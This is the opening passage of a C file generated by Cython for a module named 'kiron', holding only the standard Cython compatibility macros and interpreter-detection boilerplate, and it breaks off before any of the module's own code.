/* Generated by Cython 3.0.10 */

/* BEGIN: Cython Metadata
{
    "distutils": {
        "name": "kiron",
        "sources": [
            "/sdcard/kiron.py"
        ]
    },
    "module_name": "kiron"
}
END: Cython Metadata */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#if defined(CYTHON_LIMITED_API) && 0
  #ifndef Py_LIMITED_API
    #if CYTHON_LIMITED_API+0 > 0x03030000
      #define Py_LIMITED_API CYTHON_LIMITED_API
    #else
      #define Py_LIMITED_API 0x03030000
    #endif
  #endif
#endif

#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02070000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.7+ or Python 3.3+.
#else
#if defined(CYTHON_LIMITED_API) && CYTHON_LIMITED_API
#define __PYX_EXTRA_ABI_MODULE_NAME "limited"
#else
#define __PYX_EXTRA_ABI_MODULE_NAME ""
#endif
#define CYTHON_ABI "3_0_10" __PYX_EXTRA_ABI_MODULE_NAME
#define __PYX_ABI_MODULE_NAME "_cython_" CYTHON_ABI
#define __PYX_TYPE_MODULE_PREFIX __PYX_ABI_MODULE_NAME "."
#define CYTHON_HEX_VERSION 0x03000AF0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #define HAVE_LONG_LONG
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#define __PYX_LIMITED_VERSION_HEX PY_VERSION_HEX
#if defined(GRAALVM_PYTHON)
  /* For very preliminary testing purposes. Most variables are set the same as PyPy.
     The existence of this section does not imply that anything works or is even tested */
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS (PY_MAJOR_VERSION >= 3)
  #endif
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
  #undef CYTHON_USE_FREELISTS
  #define CYTHON_USE_FREELISTS 0
#elif defined(PYPY_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #ifndef CYTHON_USE_TYPE_SPECS
    #define CYTHON_USE_TYPE_SPECS 0
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS (PY_MAJOR_VERSION >= 3)
  #endif
  #if PY_VERSION_HEX < 0x03090000
    #undef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1 && PYPY_VERSION_NUM >= 0x07030C00)
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
  #undef CYTHON_USE_FREELISTS
  #define CYTHON_USE_FREELISTS 0
#elif defined(CYTHON_LIMITED_API)
  #ifdef Py_LIMITED_API
    #undef __PYX_LIMITED_VERSION_HEX
    #define __PYX_LIMITED_VERSION_HEX Py_LIMITED_API
  #endif
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 1
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_CLINE_IN_TRACEBACK
  #define CYTHON_CLINE_IN_TRACEBACK 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 1
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #endif
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 1
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 0
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
  #undef CYTHON_USE_FREELISTS
  #define CYTHON_USE_FREELISTS 0
#elif defined(Py_GIL_DISABLED) || defined(Py_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #ifndef CYTHON_USE_TYPE_SPECS
    #define CYTHON_USE_TYPE_SPECS 0
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #ifndef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #ifndef CYTHON_METH_FASTCALL
    #define CYTHON_METH_FASTCALL 1
  #endif
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_MODULE_STATE
    #define CYTHON_USE_MODULE_STATE 0
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
  #ifndef CYTHON_USE_FREELISTS
    #define CYTHON_USE_FREELISTS 0
  #endif
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #ifndef CYTHON_USE_TYPE_SPECS
    #define CYTHON_USE_TYPE_SPECS 0
  #endif
  #ifndef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #ifndef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #ifndef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_GIL
    #define CYTHON_FAST_GIL (PY_MAJOR_VERSION < 3 || PY_VERSION_HEX >= 0x03060000 && PY_VERSION_HEX < 0x030C00A6)
  #endif
  #ifndef CYTHON_METH_FASTCALL
    #define CYTHON_METH_FASTCALL (PY_VERSION_HEX >= 0x030700A1)
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL 1
  #endif
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_MODULE_STATE
    #define CYTHON_USE_MODULE_STATE 0
  #endif
  #if PY_VERSION_HEX < 0x030400a1
    #undef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 0
  #elif !defined(CYTHON_USE_TP_FINALIZE)
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #if PY_VERSION_HEX < 0x030600B1
    #undef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS 0
  #elif !defined(CYTHON_USE_DICT_VERSIONS)
    #define CYTHON_USE_DICT_VERSIONS  (PY_VERSION_HEX < 0x030C00A5)
  #endif
  #if PY_VERSION_HEX < 0x030700A3
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK 1
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
  #ifndef CYTHON_USE_FREELISTS
    #define CYTHON_USE_FREELISTS 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if !defined(CYTHON_VECTORCALL)
#define CYTHON_VECTORCALL  (CYTHON_FAST_PYCCALL && PY_VERSION_HEX >= 0x030800B1)
#endif
#define CYTHON_BACKPORT_VECTORCALL (CYTHON_METH_FASTCALL && PY_VERSION_HEX < 0x030800B1)
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
  #if defined(__cplusplus)
    /* for clang __has_cpp_attribute(maybe_unused) is true even before C++17
     * but leads to warnings with -pedantic, since it is a C++17 feature */
    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)
      #if __has_cpp_attribute(maybe_unused)
        #define CYTHON_UNUSED [[maybe_unused]]
      #endif
    #endif
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
  #define CYTHON_MAYBE_UNUSED_VAR(x) CYTHON_UNUSED_VAR(x)
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_USE_CPP_STD_MOVE
  #if defined(__cplusplus) && (\
    __cplusplus >= 201103L || (defined(_MSC_VER) && _MSC_VER >= 1600))
    #define CYTHON_USE_CPP_STD_MOVE 1
  #else
    #define CYTHON_USE_CPP_STD_MOVE 0
  #endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
            typedef unsigned char     uint8_t;
            typedef unsigned short    uint16_t;
            typedef unsigned int      uint32_t;
        #else
            typedef unsigned __int8   uint8_t;
            typedef unsigned __int16  uint16_t;
            typedef unsigned __int32  uint32_t;
        #endif
    #endif
    #if _MSC_VER < 1300
        #ifdef _WIN64
            typedef unsigned long long  __pyx_uintptr_t;
        #else
            typedef unsigned int        __pyx_uintptr_t;
        #endif
    #else
        #ifdef _WIN64
            typedef unsigned __int64    __pyx_uintptr_t;
        #else
            typedef unsigned __int32    __pyx_uintptr_t;
        #endif
    #endif
#else
    #include <stdint.h>
    typedef uintptr_t  __pyx_uintptr_t;
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus)
    /* for clang __has_cpp_attribute(fallthrough) is true even before C++17
     * but leads to warnings with -pedantic, since it is a C++17 feature */
    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)
      #if __has_cpp_attribute(fallthrough)
        #define CYTHON_FALLTHROUGH [[fallthrough]]
      #endif
    #endif
    #ifndef CYTHON_FALLTHROUGH
      #if __has_cpp_attribute(clang::fallthrough)
        #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
      #elif __has_cpp_attribute(gnu::fallthrough)
        #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
      #endif
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif
#ifdef __cplusplus
  template <typename T>
  struct __PYX_IS_UNSIGNED_IMPL {static const bool value = T(0) < T(-1);};
  #define __PYX_IS_UNSIGNED(type) (__PYX_IS_UNSIGNED_IMPL<type>::value)
#else
  #define __PYX_IS_UNSIGNED(type) (((type)-1) > 0)
#endif
#if CYTHON_COMPILING_IN_PYPY == 1
  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x030A0000)
#else
  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000)
#endif
#define __PYX_REINTERPRET_FUNCION(func_pointer, other_pointer) ((func_pointer)(void(*)(void))(other_pointer))

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_DefaultClassType PyClass_Type
  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if CYTHON_COMPILING_IN_LIMITED_API
    static CYTHON_INLINE PyObject* __Pyx_PyCode_New(int a, int p, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *exception_table = NULL;
        PyObject *types_module=NULL, *code_type=NULL, *result=NULL;
        #if __PYX_LIMITED_VERSION_HEX < 0x030B0000
        PyObject *version_info;
        PyObject *py_minor_version = NULL;
        #endif
        long minor_version = 0;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        #if __PYX_LIMITED_VERSION_HEX >= 0x030B0000
        minor_version = 11;
        #else
        if (!(version_info = PySys_GetObject("version_info"))) goto end;
        if (!(py_minor_version = PySequence_GetItem(version_info, 1))) goto end;
        minor_version = PyLong_AsLong(py_minor_version);
        Py_DECREF(py_minor_version);
        if (minor_version == -1 && PyErr_Occurred()) goto end;
        #endif
        if (!(types_module = PyImport_ImportModule("types"))) goto end;
        if (!(code_type = PyObject_GetAttrString(types_module, "CodeType"))) goto end;
        if (minor_version <= 7) {
            (void)p;
            result = PyObject_CallFunction(code_type, "iiiiiOOOOOOiOO", a, k, l, s, f, code,
                          c, n, v, fn, name, fline, lnos, fv, cell);
        } else if (minor_version <= 10) {
            result = PyObject_CallFunction(code_type, "iiiiiiOOOOOOiOO", a,p, k, l, s, f, code,
                          c, n, v, fn, name, fline, lnos, fv, cell);
        } else {
            if (!(exception_table = PyBytes_FromStringAndSize(NULL, 0))) goto end;
            result = PyObject_CallFunction(code_type, "iiiiiiOOOOOOOiOO", a,p, k, l, s, f, code,
                          c, n, v, fn, name, name, fline, lnos, exception_table, fv, cell);
        }
    end:
        Py_XDECREF(code_type);
        Py_XDECREF(exception_table);
        Py_XDECREF(types_module);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return result;
    }
    #ifndef CO_OPTIMIZED
    #define CO_OPTIMIZED 0x0001
    #endif
    #ifndef CO_NEWLOCALS
    #define CO_NEWLOCALS 0x0002
    #endif
    #ifndef CO_VARARGS
    #define CO_VARARGS 0x0004
    #endif
    #ifndef CO_VARKEYWORDS
    #define CO_VARKEYWORDS 0x0008
    #endif
    #ifndef CO_ASYNC_GENERATOR
    #define CO_ASYNC_GENERATOR 0x0200
    #endif
    #ifndef CO_GENERATOR
    #define CO_GENERATOR 0x0020
    #endif
    #ifndef CO_COROUTINE
    #define CO_COROUTINE 0x0080
    #endif
#elif PY_VERSION_HEX >= 0x030B0000
  static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int p, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
    PyCodeObject *result;
    PyObject *empty_bytes = PyBytes_FromStringAndSize("", 0);
    if (!empty_bytes) return NULL;
    result =
      #if PY_VERSION_HEX >= 0x030C0000
        PyUnstable_Code_NewWithPosOnlyArgs
      #else
        PyCode_NewWithPosOnlyArgs
      #endif
        (a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, name, fline, lnos, empty_bytes);
    Py_DECREF(empty_bytes);
    return result;
  }
#elif PY_VERSION_HEX >= 0x030800B2 && !CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_NewWithPosOnlyArgs(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#else
  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
#endif
#if PY_VERSION_HEX >= 0x030900A4 || defined(Py_IS_TYPE)
  #define __Pyx_IS_TYPE(ob, type) Py_IS_TYPE(ob, type)
#else
  #define __Pyx_IS_TYPE(ob, type) (((const PyObject*)ob)->ob_type == (type))
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_Is)
  #define __Pyx_Py_Is(x, y)  Py_Is(x, y)
#else
  #define __Pyx_Py_Is(x, y) ((x) == (y))
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsNone)
  #define __Pyx_Py_IsNone(ob) Py_IsNone(ob)
#else
  #define __Pyx_Py_IsNone(ob) __Pyx_Py_Is((ob), Py_None)
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsTrue)
  #define __Pyx_Py_IsTrue(ob) Py_IsTrue(ob)
#else
  #define __Pyx_Py_IsTrue(ob) __Pyx_Py_Is((ob), Py_True)
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsFalse)
  #define __Pyx_Py_IsFalse(ob) Py_IsFalse(ob)
#else
  #define __Pyx_Py_IsFalse(ob) __Pyx_Py_Is((ob), Py_False)
#endif
#define __Pyx_NoneAsNull(obj)  (__Pyx_Py_IsNone(obj) ? NULL : (obj))
#if PY_VERSION_HEX >= 0x030900F0 && !CYTHON_COMPILING_IN_PYPY
